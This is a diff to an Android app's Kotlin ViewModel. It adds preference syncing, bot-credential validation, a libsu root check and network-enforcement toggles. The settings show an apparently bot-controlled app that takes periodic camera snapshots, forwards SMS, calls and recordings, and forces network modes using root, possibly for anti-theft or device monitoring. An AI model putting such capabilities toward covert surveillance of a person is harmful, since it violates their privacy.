@@ -105,6 +105,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
 
     private val _isDashboardScreenActive = MutableStateFlow(false)
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
+    private var prefListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
 
     init {
         val cm = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -123,6 +124,28 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             }
         }
         cm.registerDefaultNetworkCallback(networkCallback!!)
+        
+        prefListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, _ ->
+            _dashboardState.update { 
+                it.copy(
+                    forceMobileData = prefs.forceMobileData,
+                    forceWifi = prefs.forceWifi,
+                    forceHotspot = prefs.forceHotspot,
+                    persistentEnforcementEnabled = prefs.persistentEnforcementEnabled,
+                    enableSnapshots = prefs.enableSnapshots,
+                    snapshotIntervalMin = prefs.snapshotIntervalMin,
+                    enableFrontCamera = prefs.enableFrontCamera,
+                    frontCameraIntervalMin = prefs.frontCameraInterval,
+                    enableRearCamera = prefs.enableRearCamera,
+                    rearCameraIntervalMin = prefs.rearCameraInterval,
+                    whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
+                    callAlertsEnabled = prefs.callAlertsEnabled,
+                    smsAlertsEnabled = prefs.smsAlertsEnabled,
+                    forwardRecordingEnabled = prefs.forwardRecordingEnabled
+                )
+            }
+        }
+        prefs.sharedPreferences.registerOnSharedPreferenceChangeListener(prefListener)
     }
 
     override fun onCleared() {
@@ -130,6 +153,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         networkCallback?.let {
             val cm = getApplication<Application>().getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             cm.unregisterNetworkCallback(it)
+        }
+        prefListener?.let {
+            prefs.sharedPreferences.unregisterOnSharedPreferenceChangeListener(it)
         }
     }
 
@@ -160,7 +186,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     var ownerUserId by mutableStateOf(prefs.ownerUserId)
 
     val hasCredentials: Boolean
-        get() = botToken.isNotBlank() && chatId.isNotBlank() && ownerUserId.isNotBlank()
+        get() = botToken.trim().matches(Regex("^[0-9]+:[a-zA-Z0-9_-]+$")) && 
+                chatId.trim().matches(Regex("^-?[0-9]+$")) && 
+                ownerUserId.trim().matches(Regex("^[0-9]+$"))
 
     // ── Dashboard State ──
     private val _dashboardState = MutableStateFlow(
@@ -270,7 +298,11 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
 
     private fun checkRootAccess(): Boolean {
         try {
-            if (com.topjohnwu.superuser.Shell.cmd("su -c id").exec().isSuccess) {
+            val cached = com.topjohnwu.superuser.Shell.getCachedShell()
+            if (cached != null && !cached.isRoot) {
+                cached.close()
+            }
+            if (com.topjohnwu.superuser.Shell.getShell().isRoot) {
                 return true
             }
         } catch (e: Exception) {
@@ -290,9 +322,17 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     // ═══════════════════════════════════════════════════════════
 
     fun saveCredentials() {
-        prefs.botToken = botToken
-        prefs.chatId = chatId
-        prefs.ownerUserId = ownerUserId
+        val token = botToken.trim()
+        val chat = chatId.trim()
+        val owner = ownerUserId.trim()
+        
+        prefs.botToken = token
+        prefs.chatId = chat
+        prefs.ownerUserId = owner
+        
+        botToken = token
+        chatId = chat
+        ownerUserId = owner
     }
 
     fun onDashboardEvent(event: DashboardEvent) {
@@ -312,7 +352,19 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             }
             is DashboardEvent.TogglePersistentEnforcement -> {
                 prefs.persistentEnforcementEnabled = event.enabled
-                _dashboardState.update { it.copy(persistentEnforcementEnabled = event.enabled) }
+                if (!event.enabled) {
+                    prefs.forceMobileData = false
+                    prefs.forceWifi = false
+                    prefs.forceHotspot = false
+                }
+                _dashboardState.update { 
+                    it.copy(
+                        persistentEnforcementEnabled = event.enabled,
+                        forceMobileData = if (!event.enabled) false else it.forceMobileData,
+                        forceWifi = if (!event.enabled) false else it.forceWifi,
+                        forceHotspot = if (!event.enabled) false else it.forceHotspot
+                    ) 
+                }
             }
             is DashboardEvent.ShowPersistentEnforcementDialog -> {
                 _dashboardState.update { it.copy(showPersistentEnforcementDialog = event.show) }
